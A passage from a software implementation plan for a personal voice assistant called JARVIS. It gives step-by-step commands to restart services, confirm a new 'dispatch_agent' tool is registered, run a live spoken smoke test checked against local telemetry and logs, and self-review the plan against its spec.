```bash
sqlite3 /home/ulrich/.local/share/jarvis/turn_telemetry.db "SELECT ts_utc FROM turns ORDER BY ts_utc DESC LIMIT 1;"
date -u "+now: %Y-%m-%dT%H:%M:%SZ"
```
If the latest `ts_utc` is within 60 s of `now`, STOP and ask the user. Otherwise proceed.

- [ ] **Step 6.2: Restart voice-agent + voice-client**

Run:
```bash
systemctl --user restart jarvis-voice-agent.service
sleep 5
systemctl --user restart jarvis-voice-client.service
sleep 6
```

- [ ] **Step 6.3: Verify the dispatch_agent tool is registered**

Run:
```bash
cd /home/ulrich/Documents/Projects/jarvis/src/voice-agent
set -a; source ../../.env; [ -f /home/ulrich/.jarvis/keys.env ] && source /home/ulrich/.jarvis/keys.env; set +a
.venv/bin/python -c "
from tools._adapter import load_all_livekit_tools
tools = load_all_livekit_tools()
def name(t):
    info = getattr(t, '__function_tool__', None) or getattr(t, '__livekit_tool_info__', None) or getattr(t, 'info', None)
    if info: return getattr(info, 'name', '?')
    return getattr(t, 'name', repr(t))
names = sorted(set(name(t) for t in tools))
print('dispatch_agent registered:', 'dispatch_agent' in names)
print('total tools:', len(names))
"
```
Expected: `dispatch_agent registered: True`, `total tools:` one more than before this PR (was 22 before, should be 23).

- [ ] **Step 6.4: Live smoke (requires the user to actually speak)**

Ask the user to say: *"Jarvis, find where the dispatch_agent tool is defined."*

Wait ~30 s, then check:

```bash
# Latest turn — confab state should be clean_tool_called; subagent_type=explore
sqlite3 /home/ulrich/.local/share/jarvis/turn_telemetry.db "SELECT ts_utc, route, confab_check_state, subagent_type, subagent_ms, subagent_status, substr(user_text,1,40), substr(jarvis_text,1,80) FROM turns ORDER BY ts_utc DESC LIMIT 1;" -separator " | "

# dispatch_agent log lines
grep "dispatch_agent" /home/ulrich/.local/share/jarvis/logs/voice-agent.log | tail -5
```

Expected:
- DB row shows `subagent_type=explore`, `subagent_status=success`, `subagent_ms` populated.
- Log shows `[dispatch_agent] spawn type=explore timeout=30.0s` then `[dispatch_agent] success type=explore ms=...`.
- JARVIS's actual voice reply mentions `tools/dispatch_agent.py` (or similar correct path).

If the supervisor declined to invoke `dispatch_agent` and answered directly, the system prompt routing nudge from Task 4 needs to be stronger — re-read Task 4's paragraph and tighten phrasing.

- [ ] **Step 6.5: No commit (verification only).** Done.

---

## Self-Review checklist (run after writing this plan, fix inline)

- **Spec coverage:**
  - § Tool surface (single tool, 4 subagent types, three params) → Task 2 schema ✓
  - § Per-type policy (timeouts, ack phrases, CLI mapping) → Task 2 `_POLICY` ✓
  - § Dispatch flow (argv list, subprocess_exec, asyncio.wait_for) → Task 2 handler ✓
  - § Front-loaded ack pipeline reuse → Task 2 `get_ack_phrase` + Task 3 wiring (agent reads the phrase) ✓
  - § Result shapes (success string / JSON error / aborted) → Task 2 handler return paths + Task 2 unit tests ✓
  - § Voice barge-in / session-id tracking → Task 2 `_active_session_token` + Task 3 bump in `_on_user_input` ✓
  - § Memory + state isolation (subprocess does NOT receive chat_ctx) → Task 2 — handler passes ONLY `task` text; no chat_ctx forwarding ✓
  - § Telemetry (3 new columns) → Task 1 + Task 3 log_turn binding ✓
  - § Supervisor prompt addition → Task 4 ✓
  - § Confab-gate interaction (dispatch_agent counts as evidence) → falls out naturally — no explicit task needed; documented in spec ✓
  - § Unit tests (mocked subprocess) → Task 2 ✓
  - § Integration test (real subprocess, gated by env) → Task 5 ✓
  - § Live verification → Task 6 ✓

- **No placeholders.** Every step contains the actual code/command. The two acknowledged "verify at implementation time" notes (CLI flag-set in Task 0.2, registry.register kwarg shape in Task 2.3) are deliberate — they're known unknowns flagged in the spec's risk section, with explicit fallback guidance. ✓

- **Type consistency.**
  - `_POLICY` keys (`explore`, `researcher`, `code_reviewer`, `plan`) match the SCHEMA enum, the supervisor.md routing paragraph, and the test parametrize cases. ✓
  - `subagent_type` / `subagent_ms` / `subagent_status` column names match between Task 1's ALTER TABLE, log_turn signature, Task 3's session attr names (`_jarvis_subagent_*`), and Task 6's verification SELECT. ✓
  - `_active_session_token` is a list (mutable slot), accessed via `[0]` everywhere. ✓
  - `_build_argv` is referenced by name only inside Task 2's implementation and Task 5's fixup note. ✓

- **TDD order.** Every code-change task has a failing-test step before implementation (Tasks 1, 2). Tasks 3 (wiring) + 4 (prompt) + 5 (integration) don't follow strict red-green-refactor because they're glue / docs / real-subprocess by nature; that matches the patterns used in earlier voice-agent commits this session. ✓

- **Frequent commits.** Each task ends with one commit. 5 commits total (Task 0 has none — env verification only; Task 6 has none — verification only). ✓
